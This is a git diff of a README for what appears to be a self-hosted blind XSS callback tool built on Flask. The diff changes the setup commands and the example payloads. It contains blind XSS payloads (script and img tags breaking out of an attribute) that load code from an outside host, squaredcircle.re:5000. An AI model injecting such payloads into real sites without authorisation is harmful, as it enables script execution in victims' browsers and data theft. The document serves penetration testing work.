@@ -15,6 +15,7 @@ $ python3
 >>> exit()
 $ export FLASK_APP=project
 $ export FLASK_DEBUG=1
+$ flask run -h 0.0.0.0 -p 5000
 $ cd certs
 $ openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
 $ flask run --cert=certs/cert.pem --key=certs/key.pem -h 0.0.0.0 -p 5000
@@ -24,9 +25,9 @@ The first time you log on, you will need to create a user/password. Choose them 
 
 Then trigger a Blind XSS with something like:
 ```
-"><script src='https://<ip>:<port>/unblind/xss/unique_str'></script>
-"><script src='https://squaredcircle.re:5000/unblind/xss/unique_str'></script>
-"><img src='https://squaredcircle.re:5000/unblind/xss/unique_str'/>
+"><script src='://<ip>:<port>/unblind/xss/unique_str'></script>
+"><script src='http://squaredcircle.re:5000/unblind/xss/unique_str'></script>
+"><img src='http://squaredcircle.re:5000/unblind/xss/unique_str'/>
 ```
 
 The tool is not beautiful neither fully functionnal. Need improvements ! Be my guest !
